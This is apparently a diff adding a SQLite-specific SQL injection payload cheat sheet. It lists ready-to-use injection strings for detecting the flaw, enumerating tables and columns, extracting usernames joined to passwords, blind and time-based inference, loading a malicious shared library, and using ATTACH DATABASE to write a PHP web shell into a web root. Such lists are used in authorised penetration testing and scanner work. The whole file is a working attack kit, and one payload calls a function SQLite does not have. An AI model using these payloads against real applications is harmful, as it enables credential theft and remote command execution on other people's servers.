@@ -1,0 +1,58 @@
+# ============================================================
+# SQL Injection — SQLite Specific
+# ============================================================
+
+# ---- Detection ----
+'
+"
+')
+")
+' --
+" --
+' OR '1'='1
+'||'
+
+# ---- Comments ----
+-- comment
+/*comment*/
+
+# ---- System Information ----
+' UNION SELECT sqlite_version(),NULL--
+' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--
+
+# ---- Enumerate Tables ----
+' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--
+' UNION SELECT tbl_name,NULL FROM sqlite_master--
+
+# ---- Enumerate Columns ----
+' UNION SELECT sql,NULL FROM sqlite_master WHERE name='users'--
+
+# ---- Data Extraction ----
+' UNION SELECT username,NULL FROM users--
+' UNION SELECT username||':'||password,NULL FROM users--
+
+# ---- Boolean Blind ----
+' AND SUBSTR(username,1,1)='a'--
+' AND LENGTH(password)=32--
+' AND (SELECT COUNT(*) FROM users)>0--
+
+# ---- Time-Based (no SLEEP, use heavy query) ----
+' AND 1=1 AND (SELECT COUNT(*) FROM sqlite_master,sqlite_master,sqlite_master,sqlite_master)>0--
+
+# ---- Load Extension (if enabled) ----
+' UNION SELECT load_extension('/tmp/evil.so'),NULL--
+'; SELECT load_extension('/tmp/evil.so')--
+
+# ---- File Ops via attach/write ----
+'; ATTACH DATABASE '/var/www/html/shell.php' AS lol--
+'; CREATE TABLE lol.pwn (dataz text)--
+'; INSERT INTO lol.pwn VALUES ('<?php system($_GET["c"]); ?>')--
+
+# ---- String Concatenation ----
+'||user()||'
+'||hex(username)||'
+
+# ---- Bypass Filters ----
+# No spaces: SELECT/**/username/**/FROM/**/users
+# Tab instead of space: SELECT%09username%09FROM%09users
+# Newline: SELECT%0ausername%0afrom%0ausers
